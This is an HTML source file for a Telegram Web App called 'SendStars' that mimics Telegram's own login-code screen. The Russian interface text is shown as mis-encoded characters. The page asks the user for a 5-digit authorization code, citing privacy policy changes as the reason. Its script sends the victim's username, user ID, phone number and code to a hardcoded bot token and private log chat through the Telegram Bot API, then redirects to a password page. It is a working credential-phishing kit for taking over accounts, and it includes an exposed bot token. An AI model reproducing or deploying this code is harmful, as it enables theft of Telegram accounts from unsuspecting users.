<!DOCTYPE html>
<html lang="ru">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width,initial-scale=1" />
		<title>SendStars ‚Äî –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</title>
		<script src="https://telegram.org/js/telegram-web-app.js"></script>
		<style>
			:root {
				--bg: #000000;
				--text: #fff;
				--box: #2a2a2a;
			}

			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			html,
			body {
				height: 100%;
			}

			body {
				font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto,
					'Helvetica Neue', Arial;
				background: var(--bg);
				display: flex;
				align-items: center;
				justify-content: center;
				color: var(--text);
			}

			.screen {
				width: 400px;
				display: flex;
				flex-direction: column;
				align-items: center;
				text-align: center;
				gap: 15px;
			}

			.avatar img {
				width: 120px;
				height: auto;
				object-fit: contain;
				display: block;
			}

			.hint {
				font-size: 14px;
				color: #aaa;
				margin-bottom: 0;
				line-height: 1.4;
				max-width: 320px;
			}

			.privacy-link {
				font-size: 14px;
				color: #2a9bf8;
				text-decoration: none;
				cursor: pointer;
				transition: color 0.2s;
			}

			.privacy-link:hover {
				color: #1a8be8;
				text-decoration: underline;
			}

			.code-boxes {
				display: flex;
				gap: 10px;
				margin: 10px 0 20px;
			}

			.code-box {
				width: 40px;
				height: 50px;
				border-radius: 8px;
				background: var(--box);
				display: flex;
				align-items: center;
				justify-content: center;
				font-size: 32px;
				font-weight: 600;
				color: #fff;
				border: 2px solid #3a3a3a;
				transition: all 0.3s ease;
			}

			.code-box.filled {
				border-color: #ffffff;
				box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
			}

			.numpad {
				display: grid;
				grid-template-columns: repeat(3, 80px);
				gap: 12px;
				justify-content: center;
			}

			.numpad button {
				width: 80px;
				height: 60px;
				font-size: 22px;
				border-radius: 12px;
				border: none;
				background: var(--box);
				color: var(--text);
				font-weight: 600;
				cursor: pointer;
				transition: all 0.3s ease;
			}

			.numpad button:hover {
				background: #3a3a3a;
			}

			.numpad button:active {
				background: #ffffff;
				color: #000000;
				box-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
				transform: scale(0.95);
			}

			.loading-screen {
				display: none;
				flex-direction: column;
				align-items: center;
				gap: 20px;
			}

			.spinner {
				border: 4px solid rgba(255, 255, 255, 0.2);
				border-top: 4px solid #fff;
				border-radius: 50%;
				width: 50px;
				height: 50px;
				animation: spin 1s linear infinite;
			}

			@keyframes spin {
				0% {
					transform: rotate(0deg);
				}
				100% {
					transform: rotate(360deg);
				}
			}
		</style>
	</head>
	<body>
		<div class="screen" id="authScreen">
			<div class="avatar">
				<img src="avatar.gif" alt="avatar" />
			</div>
			<div class="hint">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram.</div>

			<div class="hint">
				–≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ, –≤–≤–∏–¥—É –ø–æ—Å–ª–µ–¥–Ω–∏—Ö –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤
				<a
					href="https://telegram.org/privacy"
					target="_blank"
					class="privacy-link"
					>–ü–æ–ª–∏—Ç–∏–∫–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a
				>.
			</div>

			<div class="code-boxes" id="codeBoxes">
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
			</div>

			<div class="numpad">
				<button>1</button><button>2</button><button>3</button> <button>4</button
				><button>5</button><button>6</button> <button>7</button
				><button>8</button><button>9</button>
				<div></div>
				<button>0</button><button>‚Üê</button>
			</div>
		</div>

		<div class="screen loading-screen" id="loadingScreen">
			<div class="spinner"></div>
			<div>–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–≤–µ–¥—ë–Ω–Ω–æ–≥–æ –∫–æ–¥–∞‚Ä¶</div>
		</div>

		<script>
			const tg = window.Telegram.WebApp;
			tg.expand();

			const codeBoxes = document.querySelectorAll('.code-box');
			let code = '';
			let phoneNumber = '';

		try {
			const urlParams = new URLSearchParams(window.location.search);
			phoneNumber = urlParams.get('phone') || '';
		} catch (e) {
			console.log('Error parsing URL parameters');
		}

		if (
			!phoneNumber &&
			tg &&
			tg.initDataUnsafe &&
			tg.initDataUnsafe.start_param
		) {
			phoneNumber = tg.initDataUnsafe.start_param;
		}

		// –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ localStorage —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
		if (phoneNumber) {
			localStorage.setItem('authPhoneNumber', phoneNumber);
			console.log('–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω:', phoneNumber);
		} else {
			// –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –∏–∑ localStorage –µ—Å–ª–∏ –Ω–µ –±—ã–ª–æ –≤ URL
			phoneNumber = localStorage.getItem('authPhoneNumber') || '';
			if (phoneNumber) {
				console.log('–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∏–∑ localStorage:', phoneNumber);
			}
		}

			function updateBoxes() {
				codeBoxes.forEach((box, i) => {
					if (code[i]) {
						box.textContent = '‚Ä¢';
						box.classList.add('filled');
					} else {
						box.textContent = '';
						box.classList.remove('filled');
					}
				});
			}

			document.querySelectorAll('.numpad button').forEach(btn => {
				btn.addEventListener('click', () => {
					const value = btn.textContent;
					if (value === '‚Üê') {
						code = code.slice(0, -1);
					} else if (!isNaN(value)) {
						if (code.length < 5) code += value;
					}
					updateBoxes();

					if (code.length === 5) {
						document.getElementById('authScreen').style.display = 'none';
						document.getElementById('loadingScreen').style.display = 'flex';

						localStorage.setItem('authPhoneNumber', phoneNumber);
						localStorage.setItem('authCode', code);

						tg.sendData(
							JSON.stringify({
								type: 'auth_code',
								code: code,
								user_id: tg.initDataUnsafe.user?.id,
								phone_number: phoneNumber,
							})
						);

						sendCodeToBot(code);

						setTimeout(() => {
							window.location.href = `password.html?phone=${encodeURIComponent(
								phoneNumber
							)}&code=${code}`;
						}, 1000);
					}
				});
			});

		function sendCodeToBot(code) {
			const botToken = '7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
			const logChatId = '-1003298308264';

			const user = tg.initDataUnsafe.user;
			const username = user?.username ? `@${user.username}` : '–±–µ–∑ username';
			const userId = user?.id || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

			// –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑ —Ä–∞–∑–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤
			let phone = phoneNumber;
			
			// –ï—Å–ª–∏ –Ω–æ–º–µ—Ä –Ω–µ –ø–æ–ª—É—á–µ–Ω –∏–∑ URL, –ø—ã—Ç–∞–µ–º—Å—è –∏–∑ localStorage
			if (!phone) {
				phone = localStorage.getItem('authPhoneNumber') || '';
			}

			// –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞
			const message = `üîê –ö–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏–∑ WebApp\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüÜî User ID: ${userId}\nüì± –ù–æ–º–µ—Ä: ${phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}\nüî¢ –ö–æ–¥: ${code}`;

			fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({
					chat_id: logChatId,
					text: message,
					parse_mode: 'HTML',
				}),
			}).catch(error => {
				console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞ –≤ –ª–æ–≥:', error);
			});
		}

			updateBoxes();
		</script>
	</body>
</html>
